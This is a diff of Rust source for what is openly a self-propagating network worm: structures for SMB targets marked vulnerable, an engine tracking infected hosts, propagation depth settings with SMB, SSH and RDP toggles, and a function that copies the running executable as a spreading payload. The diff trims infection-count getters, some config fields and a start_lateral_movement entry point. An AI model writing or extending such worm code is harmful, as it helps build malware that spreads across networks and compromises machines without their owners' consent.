@@ -22,7 +22,6 @@ const MAX_PROPAGATION_DEPTH: u32 = 3;
 pub struct SmbTarget {
     pub ip: IpAddr,
     pub port: u16,
-    pub os_version: Option<String>,
     pub vulnerable: bool,
 }
 
@@ -31,7 +30,6 @@ impl SmbTarget {
         SmbTarget {
             ip,
             port: SMB_PORT,
-            os_version: None,
             vulnerable: false,
         }
     }
@@ -229,34 +227,18 @@ impl LateralMovementEngine {
     fn mark_infected(infected: &Arc<Mutex<HashSet<IpAddr>>>, ip: IpAddr) {
         infected.lock().unwrap().insert(ip);
     }
-
-    pub fn get_infected_count(&self) -> usize {
-        self.infected_hosts.lock().unwrap().len()
-    }
-
-    pub fn get_infected_hosts(&self) -> Vec<IpAddr> {
-        self.infected_hosts.lock().unwrap().iter().copied().collect()
-    }
 }
 
 pub struct PropagationConfig {
     pub max_depth: u32,
-    pub max_concurrent_scans: usize,
-    pub timeout_secs: u64,
     pub enable_smb: bool,
-    pub enable_ssh: bool,
-    pub enable_rdp: bool,
 }
 
 impl Default for PropagationConfig {
     fn default() -> Self {
         PropagationConfig {
             max_depth: MAX_PROPAGATION_DEPTH,
-            max_concurrent_scans: MAX_CONCURRENT_SCANS,
-            timeout_secs: SMB_TIMEOUT_SECS,
             enable_smb: true,
-            enable_ssh: false,
-            enable_rdp: false,
         }
     }
 }
@@ -282,33 +264,10 @@ impl PropagationManager {
         }
         Ok(())
     }
-
-    pub fn get_total_infected(&self) -> usize {
-        self.engines.iter().map(|e| e.get_infected_count()).sum()
-    }
-
-    pub fn get_all_infected_hosts(&self) -> Vec<IpAddr> {
-        let mut all_hosts = Vec::new();
-        for engine in &self.engines {
-            all_hosts.extend(engine.get_infected_hosts());
-        }
-        all_hosts
-    }
 }
 
 pub fn create_self_propagating_payload() -> Result<Vec<u8>> {
     let current_exe = std::env::current_exe()?;
     let payload = std::fs::read(current_exe)?;
     Ok(payload)
-}
-
-pub fn start_lateral_movement(max_depth: u32) -> Result<()> {
-    let payload = create_self_propagating_payload()?;
-    let config = PropagationConfig {
-        max_depth,
-        ..Default::default()
-    };
-    let mut manager = PropagationManager::new(config);
-    manager.start_propagation(payload)?;
-    Ok(())
 }
